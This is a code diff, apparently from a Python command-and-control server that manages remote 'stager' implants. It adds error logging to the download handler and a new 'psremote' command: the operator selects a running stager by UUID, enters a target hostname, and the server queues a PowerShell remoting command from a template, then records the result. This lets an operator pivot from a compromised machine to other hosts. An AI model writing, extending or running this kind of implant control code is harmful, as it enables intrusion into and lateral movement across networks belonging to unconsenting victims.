@@ -395,10 +395,18 @@ class myserver():
 
                     else:
                         myhistory.append("[Stager] Something wrong with download data ... ")
+                        myhistory.append("[Stager] Error: {}".format(recv_result))
                     
                     #ack in all cases
                     encode_cmd = t_mysockethandler.msf_encode(self.__t_myconstant_networking.DL_SUCCESS).encode("utf8", "ignore")
                     send_result = mysocket.send(encode_cmd)
+                    myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+                    continue
+
+                if cmd_struct_to_send[0] == "psremote":
+                    #get ack, no send
+                    recv_result = t_mysockethandler.get_nextmsg()
+                    myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                     myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                     continue
 
@@ -1413,6 +1421,25 @@ class mymainclass():
                         continue
 
                     self.__t_myserver.create_command(user_input_stager,"download",user_input_path)
+                    continue
+                
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSREMOTE:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    removecomplete()
+                    user_input_target = input("Please enter hostname: ")
+                    #print("Moving to {}".format(user_input_path))
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
                     continue
 
                     
